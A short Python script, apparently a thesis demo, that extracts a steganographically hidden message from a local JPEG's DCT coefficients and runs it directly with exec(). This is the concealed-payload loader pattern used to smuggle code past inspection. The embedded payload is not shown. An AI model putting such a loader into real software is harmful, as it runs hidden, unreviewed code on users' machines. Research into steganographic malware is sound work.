import jpeglib
from jsteg import extract_message


def main():
    image = jpeglib.read_dct('/home/cosmin/Licenta/demo/bird_stego.jpg')
    payload = extract_message(image)
    exec(payload)


if __name__ == "__main__":
    main()
